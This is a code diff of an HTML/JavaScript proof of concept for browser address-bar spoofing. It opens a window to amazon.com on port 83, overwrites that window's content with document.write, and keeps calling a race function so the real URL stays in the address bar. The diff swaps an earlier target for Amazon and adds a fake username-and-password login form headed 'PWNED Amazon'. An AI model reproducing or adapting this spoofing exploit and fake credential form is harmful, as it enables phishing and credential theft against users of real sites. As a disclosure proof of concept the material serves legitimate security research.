@@ -3,7 +3,7 @@
 </head>
 
 <body>
-    <a href="javascript:window.open('https://hub.status.network:83/','x');" onclick="startSpoof()">Spoof</a>
+    <a href="javascript:window.open('https://amazon.com:83/','x');" onclick="startSpoof()">Spoof</a>
 </body>
     
     <script>
@@ -15,17 +15,18 @@
         windowSpoof.location.href !== 'about:blank';
       }
       catch (e) {
-        windowSpoof.location.href='https://hub.status.network:83/';
+        windowSpoof.location.href='https://amazon.com:83/';
       }
     }
     
     function startSpoof() {
 
-      windowSpoof = window.open("https://hub.status.network:83/","x");
-      windowSpoof.document.write('<h1 style="color:red">Hacked!<h1>');
+      windowSpoof = window.open("https://amazon.com:83/","x");
+      windowSpoof.document.write(`<h1>PWNED Amazon</h1>
+<input type="text" placeholder="Username" id="username"><br>
+<input type="password" placeholder="Password" id="password"><br>
+<button action="#" method="post">Click me</button>`);
 
       setInterval('race()', 0);
     
     }
-   
-    </script>
